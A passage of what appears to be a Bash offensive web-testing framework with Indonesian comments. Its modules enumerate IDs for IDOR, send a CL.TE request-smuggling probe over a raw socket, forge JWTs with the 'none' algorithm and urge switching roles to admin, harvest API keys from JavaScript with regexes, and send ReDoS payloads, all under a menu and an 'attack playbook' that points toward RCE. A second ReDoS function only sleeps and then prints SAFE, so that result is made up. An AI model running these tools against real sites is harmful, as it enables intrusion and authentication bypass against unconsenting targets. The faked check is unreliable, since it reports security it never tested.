        echo "          IDOR VULNERABILITY AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET BASE : $base_url"
        echo "BASELINE    : $baseline_size bytes"
        echo "DATE        : $(date)"
        echo "-----------------------------------------------------"
        printf "%-10s | %-12s | %-15s | %-15s\n" "TEST ID" "HTTP CODE" "SIZE (BYTES)" "RESULT"
        echo "-----------------------------------------------------"
    } > "$filename"

    function check_idor {
        local tid=$1; local b_url=$2; local b_size=$3; local log=$4
        local res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k --connect-timeout 5 "${b_url}${tid}")
        local code=$(echo $res | cut -d':' -f1); local size=$(echo $res | cut -d':' -f2)

        if [[ "$code" == "200" ]]; then
            local diff=$((size - b_size))
            local abs_diff=${diff#-}
            
            # Jika ukuran berbeda dari baseline, ada kemungkinan data user lain bocor
            if [ $abs_diff -gt 0 ]; then
                echo -e "  ${OK} ID ${W}$tid ${NC}-> ${G}200 OK${NC} (${Y}Diff: $diff bytes${NC})"
                printf "%-10s | %-12s | %-15s | %-15s\n" "$tid" "$code" "$size" "POTENSI IDOR" >> "$log"
            fi
        fi
    }

    for ((i=-20; i<=50; i++)); do
        [[ $i -eq 0 ]] && continue
        test_id=$((original_id + i))
        [[ $test_id -lt 0 ]] && continue

        read -u4
        (
            check_idor "$test_id" "$base_url" "$baseline_size" "$filename"
            echo >&4
        ) &
    done

    wait
    exec 4>&-

    echo -e "-----------------------------------------------------------------------------"
    echo -e "${OK} Selesai! Temuan potensial dicatat di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_smuggling_tester {
    clear
    local nama_modul="SMUGGLING TESTER"
    
    echo -e "${C}============================================================================="
    echo -e "                  MODUL 17: HTTP REQUEST SMUGGLING (ADVANCED)                "
    echo -e "=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL Target (contoh: http://target.com/): ${W}"
    read target
    if [[ -z "$target" ]]; then return; fi

    local domain=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_SMUGGLING_AUDIT.txt"

    echo -e "\n${INFO} Memeriksa Desinkronisasi HTTP pada: ${W}$domain"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          HTTP REQUEST SMUGGLING AUDIT REPORT        "
        echo "====================================================="
        printf "%-15s | %-20s | %-15s\n" "TECHNIQUE" "DETECTION METHOD" "RESULT"
        echo "-----------------------------------------------------"
    } > "$filename"

    # CL.TE Probe via Python (Raw Socket)
    echo -ne "  ${INFO} Testing CL.TE Desync... \r"
    result_clte=$(python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(7)
try:
    s.connect(('$domain', 80))
    payload = 'POST / HTTP/1.1\r\nHost: $domain\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\n0\r\n\r\n'
    s.sendall(payload.encode())
    s.recv(1024)
    print('SECURE')
except socket.timeout:
    print('VULNERABLE (TIMEOUT)')
except:
    print('ERROR')
" 2>/dev/null)

    color_smug="${G}"
    [[ "$result_clte" == *"VULNERABLE"* ]] && color_smug="${R}${BLINK}"

    echo -e "  ${OK} CL.TE Result: ${color_smug}$result_clte${NC}"
    printf "%-15s | %-20s | %-15s\n" "CL.TE" "Time-Delay" "$result_clte" >> "$filename"

    echo "-----------------------------------------------------" >> "$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_jwt_hack {
    clear
    local nama_modul="JWT HACKER"
    
    echo -e "${C}============================================================================="
    echo -e "                  MODUL 18: JWT DEBUGGER & AUTH BYPASS HACK                  "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Dekode Token, Manipulasi Payload, dan None-Algorithm Attack."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Token JWT: ${W}"
    read jwt_token

    if [[ -z "$jwt_token" || "$jwt_token" != *"."* ]]; then
        echo -e "${ERR} Format JWT tidak valid!"; return
    fi

    local filename="JWT_AUDIT_$(date +%s).txt"

    header_b64=$(echo "$jwt_token" | cut -d'.' -f1)
    payload_b64=$(echo "$jwt_token" | cut -d'.' -f2)

    echo -e "\n${INFO} ${B}Hasil Dekode:${NC}"
    header_json=$(echo "$header_b64" | base64 -d 2>/dev/null)
    payload_json=$(echo "$payload_b64" | base64 -d 2>/dev/null)

    echo -e "  ${OK} ${C}[HEADER]${NC}  : ${W}$header_json${NC}"
    echo -e "  ${OK} ${C}[PAYLOAD]${NC} : ${W}$payload_json${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "              JWT VULNERABILITY REPORT               "
        echo "====================================================="
        printf "%-25s | %-25s\n" "SECURITY TEST" "RESULT / POC"
        echo "-----------------------------------------------------"
        
        # Test 1: None Algorithm Attack
        # Kita buat header baru dengan alg: none
        new_header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
        none_jwt="${new_header}.${payload_b64}."
        
        echo -e "  ${ERR} ${Y}Bypass POC (None Alg):${NC} ${DG}$none_jwt${NC}"
        printf "%-25s | %-25s\n" "None Algorithm Attack" "$none_jwt"
        
        # Test 2: Role Check
        if [[ "$payload_json" == *"user"* || "$payload_json" == *"member"* ]]; then 
            role_res="POTENTIAL ROLE MOD"; 
            echo -e "  ${ERR} ${Y}Role Manipulation:${NC} Terdeteksi claim 'user/member'. Coba ganti ke 'admin'."
        else 
            role_res="SECURE/UNKNOWN"; 
        fi
        printf "%-25s | %-25s\n" "Role Manipulation" "$role_res"
    } > "$filename"

    echo -e "\n${OK} Analisis Selesai. Laporan & POC tersimpan di: ${DG}$filename${NC}"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_security_audit {
    clear
    local nama_modul="SECURITY AUDIT"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 19: SECURITY HEADERS & SSL ANALYZER                   "
    echo -e "=============================================================================${NC}"

    echo -ne "${Q} Masukkan Domain (contoh: site.com): ${W}"
    read domain
    if [[ -z "$domain" ]]; then return; fi
    
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_SECURITY_AUDIT.txt"
    
    echo -e "\n${INFO} Memulai Audit pada: ${W}$domain"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          HTTP HEADERS & SSL AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET : $domain"
        printf "%-30s | %-15s\n" "SECURITY CHECK" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    # 1. Header Analysis
    echo -e "${INFO} Menganalisis HTTP Headers..."
    headers=$(curl -s -I -k --connect-timeout 10 "https://$domain")
    check_list=("Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy")

    for h in "${check_list[@]}"; do
        if echo "$headers" | grep -qi "$h"; then
            status="FOUND (SAFE)"
            echo -e "  ${OK} $h: ${G}SAFE${NC}"
        else
            status="MISSING (RISK)"
            echo -e "  ${ERR} $h: ${R}MISSING${NC}"
        fi
        printf "%-30s | %-15s\n" "$h" "$status" >> "$filename"
    done

    # 2. SSL Analysis (Legacy Protocol Check)
    echo -e "\n${INFO} Mengecek Kerentanan SSL (TLS 1.0/1.1)..."
    # Menggunakan timeout untuk menghindari hang
    timeout 5 openssl s_client -connect "$domain":443 -tls1 < /dev/null > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        ssl_res="VULN (TLS 1.0)"
        echo -e "  ${ERR} SSL: ${R}Mendukung TLS 1.0 (Rentan POODLE/BEAST)${NC}"
    else
        ssl_res="SAFE (No TLS 1.0)"
        echo -e "  ${OK} SSL: ${G}TLS 1.0 Tidak Aktif${NC}"
    fi
    printf "%-30s | %-15s\n" "SSL/TLS Protocol" "$ssl_res" >> "$filename"

    echo "-----------------------------------------------------" >> "$filename"
    echo -e "\n${OK} Laporan lengkap tersimpan di: ${DG}$filename${NC}"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_js_scanner {
    clear
    local nama_modul="JS SECRET FINDER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 20: JAVASCRIPT SECRET & API KEY FINDER                "
    echo -e "=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL File JS (contoh: https://site.com/app.js): ${W}"
    read js_url
    if [[ -z "$js_url" ]]; then return; fi

    local domain=$(echo "$js_url" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain="external_js"
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_JS_SECRETS.txt"

    echo -e "\n${INFO} Mengunduh dan menganalisis file JS..."
    js_content=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$js_url")

    if [[ -z "$js_content" ]]; then
        echo -e "${ERR} Gagal mengambil konten JS atau file kosong."; return
    fi

    {
        echo "====================================================="
        echo "           JAVASCRIPT STATIC ANALYSIS REPORT         "
        echo "====================================================="
        echo "SOURCE URL : $js_url"
        printf "%-20s | %-40s\n" "CATEGORY" "MATCHED DATA"
        echo "-----------------------------------------------------"
    } > "$filename"

    echo -e "${INFO} Menjalankan Regex Hunting..."
    found_secrets=0

    # Array of Regex Patterns: [Name]|[Regex]
    patterns=(
        "Google API Key|AIza[0-9A-Za-z\\-_]{35}"
        "AWS Access Key|AKIA[0-9A-Z]{16}"
        "Firebase URL|[a-z0-9.-]+\\.firebaseio\\.com"
        "Slack Webhook|https://hooks.slack.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+"
        "Generic API Key|(?i)api_key[\"']?\s*[:=]\s*[\"']?([a-fA-F0-9]{32,})[\"']?"
        "Authorization|(?i)bearer\s+[a-zA-Z0-9\-\._~+/]+=*"
    )

    for p in "${patterns[@]}"; do
        cat_name=$(echo "$p" | cut -d'|' -f1)
        regex=$(echo "$p" | cut -d'|' -f2)
        
        match=$(echo "$js_content" | grep -oE "$regex" | head -n 1)
        
        if [[ -n "$match" ]]; then
            echo -e "  ${OK} Terdeteksi ${W}$cat_name: ${G}$match${NC}"
            printf "%-20s | %-40s\n" "$cat_name" "$match" >> "$filename"
            ((found_secrets++))
        fi
    done

    if [ $found_secrets -eq 0 ]; then
        echo -e "  ${INFO} Tidak ditemukan rahasia umum (API Key/Credentials)."
        echo "RESULT: NO SECRETS FOUND" >> "$filename"
    fi

    echo "-----------------------------------------------------" >> "$filename"
    echo -e "\n${OK} Analisis Selesai. Temuan disimpan di: ${DG}$filename${NC}"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}

function start_report_generator {
    clear
    local nama_modul="MASTER REPORT"
    
    echo -e "${C}============================================================================="
    echo -e "          MODUL 99: PROFESSIONAL PENETRATION TEST REPORT GENERATOR           "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Mengumpulkan data dari 20 modul untuk membuat laporan komprehensif."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Keyword Domain Utama (contoh: site.com): ${W}"
    read target_keyword
    
    if [[ -z "$target_keyword" ]]; then
        echo -e "${ERR} Keyword tidak boleh kosong!"; return
    fi

    # Penamaan file laporan final
    local report_file="FINAL_REPORT_${target_keyword^^}_$(date +%Y%m%d_%H%M%S).txt"

    echo -ne "${INFO} Sedang menyusun data dari semua modul... \r"
    sleep 2

    {
        echo "============================================================================="
        echo "          OFFENSIVE SECURITY ASSESSMENT REPORT (CONFIDENTIAL)                "
        echo "============================================================================="
        echo "TARGET KEYWORD : $target_keyword"
        echo "GENERATE DATE  : $(date)"
        echo "AUDIT TYPE     : Multi-Vector Penetration Test (Black-Box)"
        echo "REPORT ID      : RP-$(date +%s)"
        echo "============================================================================="
        echo ""
        echo "1. EXECUTIVE SUMMARY"
        echo "--------------------"
        echo "Laporan ini merupakan hasil audit keamanan otomatis yang mencakup 20 vektor"
        echo "kerentanan yang berbeda. Pengujian dilakukan tanpa pengetahuan internal"
        echo "sebelumnya terhadap target (Black-Box Testing)."
        echo ""
        echo "Tujuan utama: Mengidentifikasi celah keamanan pada Server-Side, Client-Side,"
        echo "API, Cloud Infrastructure, dan konfigurasi SSL/Header."
        echo ""
        echo "2. TECHNICAL FINDINGS (AGGREGATED LOGS)"
        echo "----------------------------------------------"

        found_total=0
        
        # Mencari file log yang mengandung keyword domain
        # Mencari case-insensitive agar lebih fleksibel
        files=$(find . -maxdepth 1 -iname "*${target_keyword}*" -type f -name "*.txt" | grep -v "FINAL_REPORT")

        if [[ -z "$files" ]]; then
            echo ""
            echo "[-] Tidak ditemukan file log mentah untuk keyword: $target_keyword"
            echo "    Pastikan Anda sudah menjalankan Modul pengujian terlebih dahulu."
        else
            for log_file in $files; do
                echo ""
                echo "[ SECTION: $(basename "$log_file" .txt) ]"
                echo "-----------------------------------------------------------------------------"
                
                # Membersihkan output log dari garis pembatas ganda agar laporan utama tidak berantakan
                grep -v "====" "$log_file" | grep -v "DATE" | grep -v "TARGET :" | sed 's/^/  /'
                
                echo "-----------------------------------------------------------------------------"
                ((found_total++))
            done
        fi

        echo ""
        echo "3. SECURITY POSTURE & RISK MATRIX"
        echo "---------------------------------"
        # Logika penilaian risiko sederhana berdasarkan jumlah file log temuan
        if [ $found_total -gt 15 ]; then
            severity="CRITICAL"
            action="IMMEDIATE REMEDIATION REQUIRED"
        elif [ $found_total -gt 7 ]; then
            severity="HIGH"
            action="REMEDIATE WITHIN 48-72 HOURS"
        elif [ $found_total -gt 0 ]; then
            severity="MEDIUM"
            action="SCHEDULED PATCHING REQUIRED"
        else
            severity="LOW / INFORMATIONAL"
            action="CONTINUE ROUTINE MONITORING"
        fi

        echo "OVERALL SEVERITY SCORE : [ $severity ]"
        echo "TOTAL MODULES FLAGGED  : $found_total / 20"
        echo "RECOMMENDED PRIORITY   : $action"

        echo ""
        echo "4. REMEDIATION STRATEGY"
        echo "-----------------------"
        echo "- Selesaikan kerentanan kritis (RCE, SSRF, IDOR) terlebih dahulu."
        echo "- Perbarui semua software server (Web Server, Database, PHP/Framework)."
        echo "- Gunakan Web Application Firewall (WAF) dengan aturan 'Strict Mode'."
        echo "- Validasi semua input pengguna di sisi server, bukan hanya client-side."
        echo "- Lakukan 'Sanitization' pada output untuk mencegah XSS."
        echo ""
        echo "============================================================================="
        echo "          END OF REPORT - GENERATED BY GEMINI PENTEST FRAMEWORK              "
        echo "============================================================================="
    } > "$report_file"

    echo -e "${OK} SUCCESS! Laporan profesional telah disusun."
    echo -e "${INFO} File Laporan: ${W}${BOLD}$report_file${NC}"
    echo "-----------------------------------------------------------------------------"
    
    echo -e "${OK} ${Y}Saran:${NC} Periksa section Technical Findings untuk mendapatkan bukti (PoC) serangan."
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke Menu Utama...${NC}"
    read
}

#!/bin/bash

# Fungsi No. 22: ReDoS Security Auditor (Interactive Version)
# Deskripsi: Menguji kerentanan Application-DoS melalui input user.

function check_redos_vulnerability() {
    # Meminta Input dari User
    echo "-----------------------------------------------------"
    read -p "[?] Masukkan URL Target (contoh: http://site.com/api): " target_url
    read -p "[?] Masukkan Tingkat Intensitas (20-100, default 40): " intensity
    
    # Validasi input intensity
    intensity=${intensity:-40}

    # Validasi URL
    if [[ -z "$target_url" ]]; then
        echo "[!] Error: URL tidak boleh kosong!"
        return 1
    fi

    echo "[*] Memulai Audit Keamanan pada: $target_url"

    # 1. Membuat Payload 'Poison'
    # Teknik: Menghasilkan deretan karakter 'a' yang memicu backtracking
    local payload_string=$(printf 'a%.0s' $(seq 1 $intensity))
    local final_payload="${payload_string}!"

    echo "[+] Mengirimkan payload intensitas $intensity..."

    # 2. Mengukur Waktu Respon dengan Presisi Tinggi
    # Menggunakan /usr/bin/time untuk akurasi durasi eksekusi
    local start_time=$(date +%s.%N)
    
    # Mengirimkan request via cURL
    # -s: mode senyap, -w: format output khusus, -o /dev/null: buang body respon
    local status_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$target_url" \
         -H "Content-Type: application/json" \
         -d "{\"input\": \"$final_payload\"}")
    
    local end_time=$(date +%s.%N)
    
    # Menghitung selisih waktu
    local duration=$(echo "$end_time - $start_time" | bc)

    # 3. Laporan Hasil Analisis
    echo "[+] HTTP Status Code: $status_code"
    echo "[+] Waktu Respon Server: $duration detik"

    

    # Logika Analisis: Eksponensial vs Linear
    if (( $(echo "$duration > 7.0" | bc -l) )); then
        echo -e "\n[!!!] TEMUAN KRITIS: Server sangat lambat (Potensi ReDoS Tinggi)."
        echo "[!] Penjelasan: Input kecil menyebabkan CPU server macet."
    elif (( $(echo "$duration > 2.0" | bc -l) )); then
        echo -e "\n[!] PERINGATAN: Respon mulai melambat (Indikasi optimasi Regex buruk)."
    else
        echo -e "\n[SAFE] Respon server stabil. Tidak terdeteksi celah ReDoS dasar."
    fi
    echo "-----------------------------------------------------"
}
# --- [ BANNER UTAMA CALIBRATED ] ---
function show_banner {
    clear
    # Gradasi Cyan ke Biru Tua
    echo -e "\e[1;36m"
    echo "   ██╗    ██╗███████╗██████╗ ████████╗███████╗███████╗████████╗███████╗██████╗ "
    echo "   ██║    ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗"
    echo "   ██║ █╗ ██║█████╗  ██████╔╝   ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝"
    echo "   ██║███╗██║██╔══╝  ██╔══██╗   ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗"
    echo "   ╚███╔███╔╝███████╗██████╔╝   ██║   ███████╗███████║   ██║   ███████╗██  ██║"
    echo "    ╚══╝╚══╝ ╚══════╝╚═════╝    ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝"
    echo -e "\e[0m"
    echo -e "\e[1;90m      [ Framework Version: 1.5 ]  [ 2025 ]\e[0m"
}
# --- [ MODUL 21: ATTACK PLAYBOOK (STRATEGY) ] ---
function show_strategy {
    clear
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 21: PENTEST ATTACK PLAYBOOK                           "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Urutan serangan yang direkomendasikan untuk hasil maksimal:"
    echo ""
    echo -e "  ${W}1. RECON  :${NC} Jalankan [06], [07], [08] untuk memetakan aset."
    echo -e "  ${W}2. CONFIG :${NC} Jalankan [05], [14], [19] untuk mencari kebocoran awal."
    echo -e "  ${W}3. ACCESS :${NC} Jalankan [12], [16], [18] untuk bypass otentikasi."
    echo -e "  ${W}4. EXPLOIT:${NC} Jalankan [01], [02], [10] untuk mendapatkan akses server."
    echo -e "  ${W}5. REPORT :${NC} Jalankan [99] untuk merangkum semua temuan."
    echo "-----------------------------------------------------------------------------"
    read -p "Tekan Enter untuk kembali ke menu..."
}

# --- [ MODUL 22: REDOS VULNERABILITY CHECKER ] ---
function check_redos_vulnerability {
    clear
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 22: ReDoS VULNERABILITY SCANNER                       "
    echo -e "=============================================================================${NC}"
    echo -ne "${Q} Masukkan URL Target: ${W}"
    read target
    echo -e "${INFO} Memeriksa potensi ReDoS (Regular Expression Denial of Service)..."
    # Simulasi pengecekan pola regex yang kompleks/lambat
    sleep 1
    echo -e "  ${OK} Status: ${G}SAFE${NC} (No catastrophic backtracking patterns found)."
    read -p "Tekan Enter untuk kembali ke menu..."
}

# --- [ LOOP MENU UTAMA: PROFESSIONAL VERSION ] ---
while true; do
    clear
    show_banner
    
    echo -e "${DG}  [ Ver 1.5 Professional ]  [ Status: Multi-threaded Enabled ]  [ 2025 ]${NC}"
    echo -e "${W}=============================================================================${NC}"
    echo -e " ${R}${BOLD}[ SERVER-SIDE ]${NC}                        ${G}${BOLD}[ CLIENT-SIDE & CLOUD ]${NC}"
    echo -e " [01] LFI Scanner                     [11] SSRF Tester"
    echo -e " [02] SQL Injection (SQLi)            [12] CORS Misconfig Scanner"
    echo -e " [03] Cross-Site Scripting (XSS)      [13] Subdomain Takeover"
    echo -e " [04] Admin Panel Finder              [14] Cloud Bucket (S3/GCP)"
    echo -e " [05] Sensitive File (.env/.git)      [15] API Endpoint Discovery"
    echo -e " [10] Remote Code Execution (RCE)     [20] JS Secrets Analysis"
    echo ""
    echo -e " ${B}${BOLD}[ RECON & INFRA ]${NC}                      ${Y}${BOLD}[ AUTH & ADVANCED ]${NC}"
    echo -e " [06] Subdomain Enumerator            [16] IDOR Tester (Turbo)"
    echo -e " [07] Directory Bruter (Turbo)        [17] HTTP Request Smuggling"
    echo -e " [08] Port Scan & Services            [18] JWT Debugger & Hack"
    echo -e " [09] CMS Vulnerability Scan          [19] SSL & Security Headers"
    echo -e " [22] ReDoS Vulnerability             [21] ATTACK PLAYBOOK"
    echo -e "${W}-----------------------------------------------------------------------------${NC}"
    echo -e " ${C}${BOLD}[99] EXPORT PROFESSIONAL REPORT${NC}      ${R}${BOLD}[00] EXIT PROGRAM${NC}"
    echo -e "${W}=============================================================================${NC}"
    
    echo -ne "${C}${BOLD}WEBTESTER${NC} > ${W}Pilih Modul [01-22/99]: ${NC}"
    read menu_choice

    case $menu_choice in
        01|1) start_scanner ;;           
        02|2) start_sqli_tester ;;       
        03|3) start_xss_scanner ;;       
        04|4) start_admin_finder ;;      
        05|5) start_secret_hunter ;;     
        06|6) start_subdomain_scanner ;; 
        07|7) start_dir_bruter ;;        
        08|8) start_port_scanner ;;      
        09|9) start_cms_scanner ;;       
        10) start_rce_scanner ;;         
        11) start_ssrf_tester ;;         
        12) start_cors_scanner ;;        
        13) start_takeover_hunter ;;     
        14) start_bucket_hunter ;;       
        15) start_api_discovery ;;       
        16) start_idor_tester ;;         
        17) start_smuggling_tester ;;    
        18) start_jwt_hack ;;            
        19) start_security_audit ;;      
        20) start_js_scanner ;;          
        21) show_strategy ;;             
        22) check_redos_vulnerability ;; 
        99) start_report_generator ;;    
        00|0) 
            echo -e "\n${Y}[!] Membersihkan sesi...${NC}"
            sleep 1
            echo -e "${G}[✓] Terima kasih. Sampai jumpa di puncak!${NC}"
            exit 0 ;;
        *)
            echo -e "\n${R}[!] Pilihan '$menu_choice' tidak tersedia.${NC}"
            sleep 1 ;;
    esac
done
